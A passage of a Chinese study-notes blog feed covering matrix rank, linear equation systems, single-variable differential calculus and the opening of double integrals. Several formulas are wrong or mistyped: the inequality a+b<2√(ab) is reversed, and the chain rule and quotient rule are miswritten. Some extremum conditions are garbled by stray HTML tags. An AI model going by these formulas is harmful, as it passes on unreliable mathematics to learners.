<li>矩阵的秩：A中非零子式的最高阶数称为A的秩，记作$r(A)$</li>
<li>有关矩阵A的秩的常用表达<ol>
<li>$r(A)=r\Leftrightarrow A$中至少有r阶子式不为0，且A中任意的r阶以上子式全为0（如果有）</li>
<li>$r(A)&lt;r\Leftrightarrow A$中任意的r阶及r阶以上子式全为0</li>
<li>$r(A)\le r\Leftrightarrow A$中任意r阶以上子式全为0</li>
<li>$r(A)&gt;r\Leftrightarrow A$中至少有r+1阶子式不为0</li>
<li>$r(A)\ge r\Leftrightarrow A$中至少有r阶子式不为0</li>
</ol>
</li>
<li>设$A_{m\times n}$，则$\begin{cases}<br> r(A)&lt;n\Leftrightarrow |A| = 0\\r(A)=n\Leftrightarrow |A|\ne0<br>\end{cases}$</li>
<li>$A\ne0\Leftrightarrow r(A)\ge1$</li>
<li>讨论矩阵秩的常用方法，设A,B均为n阶方阵，则：<ol>
<li>利用矩阵秩的定义，即讨论矩阵的子式</li>
<li>利用方程组$Ax=0$有$n-r(A)$个基础解</li>
<li>$AB=O\Rightarrow\begin{cases}<br> B的列向量都是方程组Ax=0的解\\<br> r(A)+r(B)\le n<br>\end{cases}$</li>
<li>$r(AB)\le min(r(A),r(B)),r(A+B)\le r(A)+r(B)$<br><img src="/2021/04/30/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/秩的使用.png" alt="图片"></li>
</ol>
</li>
<li>证明|A|=0常用方法<ol>
<li>利用秩$r(A)&lt;n\Leftrightarrow|A|=0$</li>
<li>利用齐次线性方程组$Ax=0$有非零解$\Leftrightarrow|A|=0$</li>
<li>反证法</li>
<li>利用$|A|=\lambda_1\lambda_2\dotsb\lambda_n$，其中$\lambda_1,\lambda_2,\dotsb,\lambda_n$为A的特征值</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数-线性方程组</title>
    <url>/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
    <content><![CDATA[<h2 id="线性方程组"><a href="#线性方程组" class="headerlink" title="线性方程组"></a>线性方程组</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>我们称</p>
<script type="math/tex; mode=display">\begin{cases}
    a_{11}x_1+a_{12}x_2+\dotsb+a_{1n}x_n=b_1\\
    a_{21}x_1+a_{22}x_2+\dotsb+a_{2n}x_n=b_2\\
    \dotsb \\
    a_{m1}x_1+a_{m2}x_2+\dotsb+a_{mn}x_n=b_m
\end{cases}\tag{I}</script><p>是 n 个未知数 m 个方程的<em>非齐次线性方程组</em>，其中$x_1,x_2,\dotsb,x_n$代表 n 个未知数，而$b_1,b_2,\dotsb,b_m$是不全为0的常数</p>
<span id="more"></span>
<p>利用矩阵乘法，方程组(I)可表示法：</p>
<script type="math/tex; mode=display">\begin{bmatrix}
    a_{11} &a_{12} &\dotsb &a_{1n} \\
    a_{21} &a_{22} &\dotsb &a_{2n} \\
    \vdots &\vdots &\vdots & \\
    a_{m1} &a_{m2} &\dotsb &a_{mn}
\end{bmatrix}\begin{bmatrix}
    x_1 \\
    x_2 \\
    \vdots \\
    x_n
\end{bmatrix}=\begin{bmatrix}
    b_1 \\
    b_2 \\
    \vdots \\
    b_m
\end{bmatrix}</script><p>于是方程组(I)的矩阵形式：$Ax=b$称 A 为方程组(I)的系数矩阵</p>
<p>对矩阵 A 按列分块，记 $A=(\alpha_1,\alpha_2,\dotsb,\alpha_n)$ 则方程组(I)有向量形式 $x_1\alpha_1+x_2\alpha_2+\dotsb+x_n\alpha_n=\beta$ 其中$a_j=(a_{1j},a_{2j},\dotsb,a_{nj})^T,j=1,2,\dotsb,n,\beta=(b_1,b_2,\dotsb,b_m)^T$<br>如果$\forall j=1,2,\dotsb,m$ 恒有 $b_j=0$ ，则称</p>
<script type="math/tex; mode=display">\begin{cases}
    a_{11}x_1+a_{12}x_2+\dotsb+a_{1n}x_n=0\\
    a_{21}x_1+a_{22}x_2+\dotsb+a_{2n}x_n=0\\
    \dotsb \\
    a_{m1}x_1+a_{m2}x_2+\dotsb+a_{mn}x_n=0
\end{cases}\tag{II}</script><p>为<em>齐次线性方程组</em>。其矩阵形式为 $Ax=0$<br>齐次方程组(II)的向量形式为$x_1\alpha_1+x_2\alpha_2+\dotsb+x_n\alpha_n=0$<br>若将一组数 $c_1,c_2,\dotsb,c_n$ 分别代替方程组(I)（或(II)中的$x_1,x_2,\dotsb,x_n$）使(I)（或(II)）中 m 个等式都成立，则称$c_1,c_2,\dotsb,c_n)^T$是方程组(I)（或(II)）的一个解</p>
<p>求方程组的解就是要对所给方程组作同解变形，而同解变形的方法：</p>
<ol>
<li>两个方程互换位置</li>
<li>用非零常数乘方程的两端</li>
<li>把某个方程的 k 倍加到另一个方程上</li>
</ol>
<h3 id="线性方程组解的基本定理"><a href="#线性方程组解的基本定理" class="headerlink" title="线性方程组解的基本定理"></a>线性方程组解的基本定理</h3><p><strong>定理1</strong> 设 A 为 $m\times n$矩阵，则<br>(1)齐次线性方程组 $AX=0$ 只有零解的充分必要条件是 $r(A)=n$<br>(2)齐次线性方程组 $AX=0$ 有非零解（或有无数个解）的充分必要条件是 $r(A)&lt;n$</p>
<p><strong>推论1</strong> 设 A 为 n 阶，则<br>(1)齐次线性方程组 $AX=0$ 只有零解的充分必要条件是 $|A|\ne0$<br>(2)齐次线性方程组 $AX=0$ 有非零解（或无数个解）的充分必要条件是 $|A|=0$<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理1.1.png" alt="图片"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理1.2.png" alt="图片"><br><strong>定理2</strong> 设 A 是 $m\times n$，增广矩阵 $\overline{A}=(A\vdots b)$，则<br>(1)非齐次线性方程组 $AX=b$ 有解的充分必要条件是 $r(A)=r(\overline{A})$，其中当 $r(A)=r(\overline{A})=n$ 时，非齐次线性方程组 $AX=b$ 有唯一解；当 $r(A)=r(\overline{A})&lt;n$ 时，非齐次线性方程组$AX=b$有无数个解<br>(2)非齐次线性方程组 $AX=0$ 无解的充分必要条件是 $r(A)\ne r(\overline{A})$</p>
<p><strong>推论2</strong> 设 A 是 n 阶矩阵，则<br>(1) 非齐次线性方程组 $AX=b$ 有解的充分必要条件是 $r(A)=r(\overline{A})$，其中当$|A|\ne0$时，方程组有唯一解；当$|A|=0$时，方程组有无数个解<br>(2)非齐次线性方程组 $AX=b$ 无解的充分必要条件是 $r(A)\ne r(\overline{A})$<br>(3 设$A_{m\times n}$，若$r(A)=m$(即行满秩)，则非齐次线性方程组$Ax=b$有解。事实上，此时$r(A)=r(A,b)=m$，所以$Ax=b$有解<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理2.1.png" alt="图片"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理22.png" alt="图片"></p>
<h3 id="线性方程组解的结构"><a href="#线性方程组解的结构" class="headerlink" title="线性方程组解的结构"></a>线性方程组解的结构</h3><ol>
<li>设 $X_1,X_2,\dotsb,X_s$ 为齐次线性方程组 $AX=0$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s$ 也为齐次线性方程组 $AX=0$ 的解，其中 $k_1,k_2,\dotsb,k_s$ 为任意常数</li>
<li>设 $\eta_0$ 为非齐次线性方程组 $AX=b$ 的一个解，$X_1,X_2,\dotsb,X_s$ 为齐次线性方程组 $AX=0$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s+\eta_0$ 为非齐次线性方程组 $AX=b$ 的解</li>
<li>设 $\eta_1,\eta_2$ 为非齐次线性方程组 $AX=b$ 的两个解，则 $\eta_2-\eta_1$ 为齐次线性方程组 $AX=0$ 的一个解</li>
<li>设 $\xi$ 是方程组 $Ax=b$ 的解，$\eta$ 是导出组 $Ax=0$ 的解，k 是任意常数，则 $\xi+k\eta$ 是方程组 $Ax=b$ 的解</li>
<li>设 $X_1,X_2,\dotsb,X_s$ 为非齐次线性方程组 $AX=b$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s$ 为 $AX=b$ 的解的充分必要条件是 $k_1+k_2+\dotsb+k_s=1$</li>
<li>设 $\eta_1,\eta_2,\dotsb,\eta_s$ 为非齐次线性方程组 $AX=b$ 的一组解，则 $k_1\eta_1+k_2\eta_2+\dotsb+k_s\eta_s$ 为齐次线性方程组 $AX=0$ 的解的充分必要条件是 $k_1+k_2+\dotsb+k_s=0$</li>
</ol>
<h3 id="线性方程组的通解"><a href="#线性方程组的通解" class="headerlink" title="线性方程组的通解"></a>线性方程组的通解</h3><h4 id="齐次线性方程组-AX-0-的基础解系与通解"><a href="#齐次线性方程组-AX-0-的基础解系与通解" class="headerlink" title="齐次线性方程组 $AX=0$ 的基础解系与通解"></a>齐次线性方程组 $AX=0$ 的基础解系与通解</h4><ol>
<li><p>基础解系——设$r(A)=r&lt;n$，则$AX=0$所有解构成的解向量组的极大线性无关组成为方程组$AX=0$的一个基础解系。当$r(A)=r$时，$AX=0$的基础解系所含的线性无关的解向量的个数为$n-r$个</p>
<pre><code> 设A为$m\times n$矩阵，且$r(A)=r&lt;n$,所谓$AX=0$的基础解系，即满足如下三个条件的向量组
 (1)该向量组中每个向量都是$AX=0$的解；
 (2)该向量组线性无关；
 (3)该向量组所含解向量的个数等于$nーr$
</code></pre></li>
<li><p>通解——设$\xi_1,\xi_2,\dotsb,\xi_{n-r}$为齐次线性方程组$AX=0$的一个基础解系，则称$k\xi_1+k_2\xi_2+\dotsb+k_{n-r}\xi_{n-r}$为齐次线性方程组$AX=0$的通解，其中$k_1,k_2,\dotsb,k_{n-r}$为任意常数</p>
</li>
</ol>
<h4 id="非齐次线性方程组-AX-b-的通解"><a href="#非齐次线性方程组-AX-b-的通解" class="headerlink" title="非齐次线性方程组 $AX=b$的通解"></a>非齐次线性方程组 $AX=b$的通解</h4><p>设$r(A)=r(\overline{A})=r&lt;n$且$\xi_1,\xi_2,\dotsb,\xi_{n-r}$为$AX=b$的导出方程组$AX=0$的一个基础解系，$\eta_0$为$AX=b$的一个解，则$AX=b$的通解为$k\xi_1+k_2\xi_2+\dotsb+k_{n-r}\xi_{n-r}+\eta_0$，其中$k_1,k_2,\dotsb,k_{n-r}$为任意常数<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/非线性方程组通解注解.png" alt="图片"></p>
<h3 id="方程组解的理论延伸"><a href="#方程组解的理论延伸" class="headerlink" title="方程组解的理论延伸"></a>方程组解的理论延伸</h3><ol>
<li>设 $A$ 是 $m\times n$矩阵，B是$n\times s$矩阵，若$AB=0$，则B的列向量组为方程组$AX=0$的解</li>
<li>设方程组$AX=0$与$BX=0$为同解方程组，则$r(A)=r(B)$,反之不对</li>
<li>设方程组$AX=0$的解为$BX=0$的解，则$r(A)\ge r(B)$<br> 1.若方程组$AX=0$的解为方程组$BX=0$的解，但方程组$BX=0$的解不全是方程组$AX=0$的解，则$r(A)&gt;r(B)$<br> 2.若方程纽$AX=0$的解为方程组$BX=0$的解，且$r(A)=r(B)$,则方程组$AX=0$与方程组$BX=0$同解</li>
<li>设<script type="math/tex">AX=b\tag{I}$$$$BX=c\tag{II}</script>则线性方程组$(\overset{A}{B})X=(\overset{b}{c})$的解即为线性方程组(I)和(II)的解</li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>高等数学-一元函数微分学</title>
    <url>/2021/05/16/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6/</url>
    <content><![CDATA[<h2 id="导数与微分的概念"><a href="#导数与微分的概念" class="headerlink" title="导数与微分的概念"></a>导数与微分的概念</h2><h3 id="导数的概念"><a href="#导数的概念" class="headerlink" title="导数的概念"></a>导数的概念</h3><p>函数$f(x)$在$x_0$处可导的充分必要条件是它在该点的左导数与右导数都存在且相等</p>
<h3 id="微分的概念"><a href="#微分的概念" class="headerlink" title="微分的概念"></a>微分的概念</h3><p>函数$y=f(x)$在$x_0$点处可微的充分必要条件是$f(x)$在点$x_0$处可导，且有$\mathrm{d}y=f’(x_0)\Delta x=f’(x_0)\mathrm{d}x$，在点$x$处，常记$\mathrm{d}y=f’(x)\mathrm{d}x$</p>
<h2 id="导数公式及求导法则"><a href="#导数公式及求导法则" class="headerlink" title="导数公式及求导法则"></a>导数公式及求导法则</h2><h3 id="基本初等函数的导数公式"><a href="#基本初等函数的导数公式" class="headerlink" title="基本初等函数的导数公式"></a>基本初等函数的导数公式</h3><p><img src="/2021/05/16/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6/求导公式-1.png" alt="photo"><br><img src="/2021/05/16/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%B8%80%E5%85%83%E5%87%BD%E6%95%B0%E5%BE%AE%E5%88%86%E5%AD%A6/求导公式-2.png" alt="photo"></p>
<h3 id="求导法则"><a href="#求导法则" class="headerlink" title="求导法则"></a>求导法则</h3><h4 id="有理运算"><a href="#有理运算" class="headerlink" title="有理运算"></a>有理运算</h4><p>设$u=u(x),v=v(x)$在x处可导，则</p>
<ol>
<li>$(u\pm v)’=u’\pm v’$</li>
<li>$(uv)’=u’v+uv’$</li>
<li>$(\frac{u}{v})’=\frac{u’v-uv’}{v2}(v\ne0)$</li>
</ol>
<h4 id="复合函数求导"><a href="#复合函数求导" class="headerlink" title="复合函数求导"></a>复合函数求导</h4><p>设$u=\varphi(x)$在x处可导，$y=f(u)$在对应点处可导，则复合函数$y=f[\varphi(x)]$在x处可导，且$\frac{dy}{dx}=\frac{dy}{du}\cdot\frac{du}{dx}=f’(u)\varphi(x)$</p>
<h4 id="隐函数求导"><a href="#隐函数求导" class="headerlink" title="隐函数求导"></a>隐函数求导</h4><h4 id="反函数求导"><a href="#反函数求导" class="headerlink" title="反函数求导"></a>反函数求导</h4><p>$\varphi’(y)=\frac{1}{f’(x)}\Leftrightarrow\frac{\mathrm{d}x}{\mathrm{d}y}=\frac{1}{\frac{\mathrm{d}y}{\mathrm{d}x}}$<br>$\varphi’’(y)=\frac{\mathrm{d}}{\mathrm{d}x}[\frac{1}{f’(x)}]\cdot\frac{\mathrm{d}x}{\mathrm{d}y}=-\frac{f’’(x)}{f’(x)^2}\cdot\frac{1}{f’(x)}$</p>
<h4 id="参数方程求导"><a href="#参数方程求导" class="headerlink" title="参数方程求导"></a>参数方程求导</h4><p>设$y=y(x)$是由参数方程<script type="math/tex">\begin{cases}
   x=\varphi(t)\\
   y=\psi(t)
\end{cases}(\alpha<t<\beta)</script>确定的函数，则</p>
<p>(1) 若$\varphi(t)和\psi(t)$都可导，且$\varphi’(t)\ne0$，则$\frac{dy}{dx}=\frac{\psi’(t)}{\varphi’(t)}$</p>
<p>(2) 若$\varphi(t)和\psi(t)$二阶可导，且$\varphi’(t)\ne0$，则$\frac{d^2y}{dx^2}=\frac{d}{dt}(\frac{\psi’(t)}{\varphi’(t)})\frac{1}{\varphi’(t)}=\frac{\psi’’(t)\varphi’(t)-\varphi’’(t)\psi’(t)}{\varphi’^3(t)}$</p>
<h4 id="常用结论"><a href="#常用结论" class="headerlink" title="常用结论"></a>常用结论</h4><p>设$f(x)=\varphi(x)|x-a|$，其$\varphi(x)$在$x=a$处连续，则$f(x)$在$x=a$处可导的充要条件是$\varphi(a)=0$</p>
<p>$f(x)$可导$\overset{\nrightarrow}{\nleftarrow}|f(x)|$可导<br>设$f(x)$连续<br>(1) 若$f(x_0)\ne0$，则在$x_0$处$f(x)$可导$\Leftrightarrow|f(x)|$可导<br>(2) 若$f(x_0)=0$，则$f’(x_0)=0\Leftrightarrow|f(x)|$在$x_0$处可导</p>
<h2 id="高阶导数"><a href="#高阶导数" class="headerlink" title="高阶导数"></a>高阶导数</h2><h3 id="常用的高阶导数公式"><a href="#常用的高阶导数公式" class="headerlink" title="常用的高阶导数公式"></a>常用的高阶导数公式</h3><ol>
<li>$(\sin x)^{(n)}=\sin(x+n\cdot\frac{\pi}{2})$</li>
<li>$(\cos x)^{(n)}=\cos(x+n\cdot\frac{\pi}{2})$</li>
<li>$(u\pm v)^{(n)}=u^{(n)}\pm v^{(n)}$</li>
<li>$(uv)^{(n)}=\sum_{k=0}^nC_n^ku^{(k)}v^{(n-k)}$</li>
</ol>
<h2 id="微分中值定理"><a href="#微分中值定理" class="headerlink" title="微分中值定理"></a>微分中值定理</h2><h3 id="费马引理"><a href="#费马引理" class="headerlink" title="费马引理"></a>费马引理</h3><p>设函数$f(x)$在点$x_0$处可导，如果函数$f(x)$在点$x_0$处取得极值，那么$f’(x_0)=0$</p>
<h3 id="罗尔定理"><a href="#罗尔定理" class="headerlink" title="罗尔定理"></a>罗尔定理</h3><p>如果$f(x)$满足以下条件：<br>(1) 在闭区间[a,b]上连续<br>(2) 在开区间(a,b)内可导<br>(3) $f(a)=f(b)$<br>则在(a,b)内至少存在一点$\xi$，使得$f’(\xi)=0$</p>
<h3 id="拉格朗日中值定理"><a href="#拉格朗日中值定理" class="headerlink" title="拉格朗日中值定理"></a>拉格朗日中值定理</h3><p>如果$f(x)$满足以下条件：<br>(1) 在闭区间[a,b]上连续<br>(2) 在开区间(a,b)内可导<br>则在(a,b)内至少存在一点$\xi$，使得$f(b)-f(a)=f’(\xi)(b-a)$</p>
<p>如果在(a,b)内恒有$f’(x)=0$，则在(a,b)内$f(x)$为常数</p>
<h3 id="柯西中值定理"><a href="#柯西中值定理" class="headerlink" title="柯西中值定理"></a>柯西中值定理</h3><p>如果$f(x),F(x)$满足以下条件：<br>(1) 在闭区间[a,b]上连续<br>(2) 在开区间(a,b)内可导，且$F’(x)$在(a,b)内每一点处均不为零，则在(a,b)内至少存在一点$\xi$，使得$\frac{f(b)-f(a)}{F(b)-F(a)}=\frac{f’(\xi)}{F’(\xi)}$</p>
<h3 id="皮亚诺型余项泰勒公式"><a href="#皮亚诺型余项泰勒公式" class="headerlink" title="皮亚诺型余项泰勒公式"></a>皮亚诺型余项泰勒公式</h3><p>如果$f(x)$在点$x_0$有直至n阶的导数，则有$f(x)=f(x_0)+f’(x_0)(x-x_0)+\frac{1}{2!}f’’(x_0)(x-x_0)^2+\dotsb+\frac{1}{n!}f^{(n)}(x_0)(x-x_0)^n+o[(x-x_0)^n]$,常称$R_n(x)=o(x-x_0)^n$为皮亚诺余项</p>
<h3 id="拉格朗日型余项泰勒公式"><a href="#拉格朗日型余项泰勒公式" class="headerlink" title="拉格朗日型余项泰勒公式"></a>拉格朗日型余项泰勒公式</h3><p>设函数$f(x)$在含有$x_0$的开区间(a,b)内有n+1阶导数，则当$x\in(a,b)$时有$f(x)=f(x_0)+f’(x_0)(x-x_0)+\frac{1}{2!}f’’(x_0)(x-x_0)^2+\dotsb+\frac{1}{n!}f^{(n)}(x_0)(x-x_0)^n+R_n(x)$</p>
<h2 id="导数的应用"><a href="#导数的应用" class="headerlink" title="导数的应用"></a>导数的应用</h2><h3 id="函数的单调性"><a href="#函数的单调性" class="headerlink" title="函数的单调性"></a>函数的单调性</h3><h3 id="函数的极值"><a href="#函数的极值" class="headerlink" title="函数的极值"></a>函数的极值</h3><p><strong>极值必要条件</strong><br>设$y=f(x)$在点$x_0$出可导，如果$x_0$为$f(x)$的极值点，则$f’(x_0)=0$</p>
<p><strong>极值第一充分条件</strong><br>设$y=f(x)$在点$x_0$的某去心邻域内可导，且$f’(x_0)=0$（或$f(x)$在$x_0$处连续）<br>(1) 若$x<x_0$时，$f'(x)>0,x>x_0$时，$f'(x)<0$，则$x_0$为$f(x)$的极大值点 (2) 若$x<x_0$时，$f'(x)<0,x>x_0$时，$f'(x)>0$，则$x_0$为$f(x)$的极小值点<br>(3) 若$f’(x)$在点$x_0$的两侧同号，则$x_0$不为$f(x)$的极值点</0$，则$x_0$为$f(x)$的极大值点></x_0$时，$f'(x)></p>
<p><strong>极值的第二充分条件</strong><br>设$y=f(x)$在点$x_0$处二阶可导，且$f’(x_0)=0$<br>(1) 若$f’’(x_0)<0$，则$x_0$为$f(x)$的极大值点 (2) 若$f''(x_0)>0$，则$x_0$为$f(x)$的极小值点<br>(3) 若$f’’(x_0)=0$，则此方法不能判定$x_0$是否为极值点</0$，则$x_0$为$f(x)$的极大值点></p>
<h3 id="函数的最大值与最小值"><a href="#函数的最大值与最小值" class="headerlink" title="函数的最大值与最小值"></a>函数的最大值与最小值</h3><h3 id="曲线的凹凸性"><a href="#曲线的凹凸性" class="headerlink" title="曲线的凹凸性"></a>曲线的凹凸性</h3><p>设函数$y=f(x)$在[a,b]上连续，在(a,b)内二阶可导，那么<br>(1) 若在(a,b)内有$f’’(x)&gt;0$，则$f(x)$在[a,b]上的图形式凹的<br>(1) 若在(a,b)内有$f’’(x)&lt;0$，则$f(x)$在[a,b]上的图形式凸的</p>
<p><strong>拐点的必要条件</strong><br>设$y=f(x)$在点$x_0$处二阶可导，且点$(x_0,f(x_0))$为曲线$y=f(x)$的拐点，则$f’’(x_0)=0$</p>
<p><strong>拐点的第一充分条件</strong><br>设$y=f(x)$在点$x_0$的某去心邻域内二阶可导，且$f’’(x_0)=0$(或$f(x)$在$x_0$处连续)<br>(1) 若$f’’(x)$在$x_0$的左、右两侧异号，则点$(x_0,f(x_0))$为曲线$y=f(x)$的拐点<br>(2) 若$f’’(x)$在$x_0$的左、右两侧同号，则点$(x_0,f(x_0))$不为曲线$y=f(x)$的拐点</p>
<p><strong>拐点的第二充分条件</strong><br>设$y=f(x)$在点$x_0$处三阶可导，且$f’’(x_0)=0$<br>(1) 若$f’’’(x_0)\ne0$，则点$(x_0,f(x_0))$为曲线$y=f(x)$的拐点<br>(2) 若$f’’’(x_0)=0$，则此方法不能判定$(x_0,f(x_0))$是否为曲线$y=f(x)$的拐点</p>
<h3 id="曲线的渐近线"><a href="#曲线的渐近线" class="headerlink" title="曲线的渐近线"></a>曲线的渐近线</h3><p><strong>水平渐近线</strong><br>若$\lim\limits_{x\rightarrow\infty}f(x)=A$(或$\lim\limits_{x\rightarrow-\infty}f(x)=A,or\lim\limits_{x\rightarrow+\infty}f(x)=A$)，那么$y=A$是曲线$y=f(x)$水平渐近线</p>
<p><strong>垂直渐近线</strong><br>若$\lim\limits_{x\rightarrow x_0}f(x)=\infty$(或$\lim\limits_{x\rightarrow x_0^-}f(x)=\infty,or\lim\limits_{x\rightarrow x_0^+}f(x)=\infty$)，那么$x=x_0$是曲线$y=f(x)$的垂直渐近线</p>
<p><strong>斜渐近线</strong><br>若$\lim\limits_{x\rightarrow\infty}\frac{f(x)}{x}=a$，且$\lim\limits_{x\rightarrow\infty}(f(x)-ax)=b(orx\rightarrow-\infty,orx\rightarrow+\infty)$，那么$y=ax+b$是曲线$y=f(x)$的渐近线</p>
<h3 id="曲线的弧微分与曲率"><a href="#曲线的弧微分与曲率" class="headerlink" title="曲线的弧微分与曲率"></a>曲线的弧微分与曲率</h3><p><strong>弧微分</strong><br>设$y=f(x)$在(a,b)内有连续导数，则有弧微分$\mathrm{d}s=\sqrt{1+y’^2}\mathrm{d}x$</p>
<p><strong>曲率</strong><br>设$y=f(x)$有二阶导数，则有曲率$K=\frac{|y’’|}{(1+y’^2)^\frac{3}{2}}$</p>
<p><strong>曲率圆与曲率半径</strong></p>
<script type="math/tex; mode=display">R=\frac{1}{K}</script><h2 id="常考题型"><a href="#常考题型" class="headerlink" title="常考题型"></a>常考题型</h2><h3 id="常用不等式"><a href="#常用不等式" class="headerlink" title="常用不等式"></a>常用不等式</h3><p>$\sin x &lt; x &lt;\tan x,a+b &lt; 2\sqrt{ab},\frac{x}{1+x} &lt; \ln(1+x) &lt; x(x&gt;0)$</p>
<p>$f(\frac{x+y}{2})\le\frac{f(x)+f(y)}{2}$</p>
<h3 id="微分中值定理证明"><a href="#微分中值定理证明" class="headerlink" title="微分中值定理证明"></a>微分中值定理证明</h3><p><strong>证明存在一个点$\xi\in(a,b)$，使$F[\xi,f(\xi),f’(\xi)]=0$</strong></p>
<ol>
<li>分析法<ol>
<li>确定辅助函数$g(x),g’(x)=F[\xi,f(\xi),f’(\xi)]$</li>
</ol>
</li>
<li>微分方程法<ol>
<li>求微分方程$F(x,y,y’)=0$的通解$H(x,y)=C$</li>
<li>设辅助函数：$g(x)=H(x,f(x))$</li>
</ol>
</li>
</ol>
<p>常用辅助函数<br>(1) 欲证$f’(\xi)+\lambda f(\xi)=0\Rightarrow F(x)=e^{-\lambda x}f(x)$<br>(2) 欲证$\alpha f’(\xi)+\beta f(\xi)=0\Rightarrow F(x)=e^{\frac{\beta}{\alpha}x}f(x)(\alpha\ne0)$<br>(3) 欲证$f’(\xi)+g’(\xi)f(\xi)=0\Rightarrow F(x)=e^{g(x)}f(x)$<br>(4) 欲证$f’(\xi)+g(\xi)f(\xi)=0\Rightarrow F(x)=e^{\int g(x)\mathrm{d}x}f(x)$</p>
<p><strong>证明存在两个中值点$\xi,\eta\in(a,b)$，使$F[\xi,\eta,f(\xi),f(\eta),f’(\xi),f’(\eta)=0$</strong><br>(1) 不要求$\xi\ne\eta$<br>    在同一区间[a,b]上用两次中值定理<br>(2) 要求$\xi\ne\eta$<br>将区间[a,b]分为两个子区间，在两个子区间上分别用拉格朗日中值定理</p>
<p>**证明存在一个中值带你$\xi\in(a,b)$，使$F[\xi,f^{(n)}(\xi)]\ge0(n\ge2)$</p>
<p>用拉格朗日余项的泰勒公式，其中$x_0$点选题目提供函数值和导数信息多的点</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>高等数学</tag>
      </tags>
  </entry>
  <entry>
    <title>高等数学-二重积分</title>
    <url>/2021/06/11/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86/</url>
    <content><![CDATA[<h2 id="二重积分的概念"><a href="#二重积分的概念" class="headerlink" title="二重积分的概念"></a>二重积分的概念</h2><script type="math/tex; mode=display">\iint_Df(x,y)d\sigma=\lim\limits_{\lambda\rightarrow0}\sum_{i=1}^nf(\xi_i,\eta_i)\Delta\sigma_i</script><h2 id="二重积分的几何意义"><a href="#二重积分的几何意义" class="headerlink" title="二重积分的几何意义"></a>二重积分的几何意义</h2><p>二重积分$\iint_Df(x,y)d\sigma$是一个数。当$f(x,y)\ge0$时，其值等于以积分域D为底，以曲面$z=f(x,y)$为曲顶的曲顶柱体的体积</p>
<h2 id="二重积分的性质"><a href="#二重积分的性质" class="headerlink" title="二重积分的性质"></a>二重积分的性质</h2><h3 id="不等式性质"><a href="#不等式性质" class="headerlink" title="不等式性质"></a>不等式性质</h3><ol>
<li>若在D上$f(x,y)\le g(x,y)$，则$\iint_Df(x,y)d\sigma\le\iint_Dg(x,y)d\sigma$</li>
<li>若$f(x,y)$在D上连续，则$mS\le\iint_Df(x,y)d\sigma\le MS$，其中m和M分别为$f(x,y)$在D上的最小值和最大值，S为积分域D的面积</li>
<li>$|\iint_Df(x,y)d\sigma|\le\iint_D|f(x,y)|d\sigma$</li>
</ol>
<h3 id="积分中值定理"><a href="#积分中值定理" class="headerlink" title="积分中值定理"></a>积分中值定理</h3><p>若$f(x,y)$在D上连续，则$\iint_Df(x,y)d\sigma=f(\xi,\eta)S$，其中$(\xi,\eta)\in D,S$为积分域D的面积</p>
<h2 id="二重积分的计算"><a href="#二重积分的计算" class="headerlink" title="二重积分的计算"></a>二重积分的计算</h2><h3 id="利用直角坐标计算"><a href="#利用直角坐标计算" class="headerlink" title="利用直角坐标计算"></a>利用直角坐标计算</h3><p><strong>先y后x</strong><br>若积分域D是X型区域，即积分域D可以用不等式$y_1(x)\le y\le y_2(x),a\le x\le b$来表示，则<br><img src="/2021/06/11/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86/1-1.png" alt="photo"></p>
<script type="math/tex; mode=display">\iint_Df(x,y)d\sigma=\int_a^bdx\int_{y_1(x)}^{y_2(x)}f(x,y)dy</script><p><strong>先x后y</strong><br>若积分域D是Y型区域，即积分域D可以用不等式$x_1(y)\le x\le x_2(y),c\le y\le d$来表示，则<br><img src="/2021/06/11/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6-%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86/1-2.png" alt="photo"></p>
